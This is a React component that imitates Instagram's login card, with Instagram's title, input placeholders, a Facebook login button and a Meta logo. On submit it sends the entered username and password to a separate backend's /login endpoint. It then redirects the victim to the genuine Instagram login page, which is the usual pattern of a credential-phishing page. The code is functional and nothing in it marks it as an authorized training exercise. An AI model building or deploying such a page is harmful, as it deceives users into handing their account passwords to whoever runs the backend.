import React, { useState } from 'react'
import FacebookIcon from './FacebookIcon'

export default function LoginForm({ onFacebookClick }) {
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  })
  const [isLoading, setIsLoading] = useState(false)

  const handleChange = (e) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      const backendUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000';
      const response = await fetch(`${backendUrl}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          identifier: formData.username,
          password: formData.password
        })
      });

      const data = await response.json();
      if (!response.ok) {
        alert(data.error || 'Login failed');
      } else {
        window.location.href = data.redirectUrl || 'https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav';
      }
    } catch (err) {
      alert('Network error. Is the backend running on port 5000?');
    } finally {
      setIsLoading(false);
    }
  }

  const isFormValid = formData.username.length > 0 && formData.password.length > 0

  return (
    <div className="login-card">
      <h1 className="login-title" id="login-heading">Log into Instagram</h1>

      <form onSubmit={handleSubmit} autoComplete="off">
        <div className="form-group">
          <input
            id="login-username"
            className="form-input"
            type="text"
            name="username"
            placeholder="Mobile number, username or email"
            value={formData.username}
            onChange={handleChange}
            autoComplete="username"
            aria-label="Mobile number, username or email"
          />
        </div>

        <div className="form-group">
          <input
            id="login-password"
            className="form-input"
            type="password"
            name="password"
            placeholder="Password"
            value={formData.password}
            onChange={handleChange}
            autoComplete="current-password"
            aria-label="Password"
          />
        </div>

        <button
          id="login-submit"
          className="btn-login"
          type="submit"
          disabled={!isFormValid || isLoading}
          style={{ opacity: isFormValid ? 1 : 0.6 }}
        >
          {isLoading ? 'Logging in...' : 'Log in'}
        </button>
      </form>

      <div className="forgot-password">
        <a href="#" id="forgot-password-link">Forgot password?</a>
      </div>

      <div className="divider">
        <span className="divider-line"></span>
        <span className="divider-text">or</span>
        <span className="divider-line"></span>
      </div>

      <button id="facebook-login" className="btn-facebook" type="button" onClick={onFacebookClick}>
        <FacebookIcon className="fb-icon" />
        Log in with Facebook
      </button>

      <button id="create-account" className="btn-create" type="button">
        Create new account
      </button>

      <div className="meta-logo">
        <svg width="70" height="18" viewBox="0 0 70 18" xmlns="http://www.w3.org/2000/svg">
          <text x="0" y="14" fontFamily="Inter, sans-serif" fontSize="13" fontWeight="400" fill="#737373" letterSpacing="0.5">
            <tspan>⊗ Meta</tspan>
          </text>
        </svg>
      </div>
    </div>
  )
}
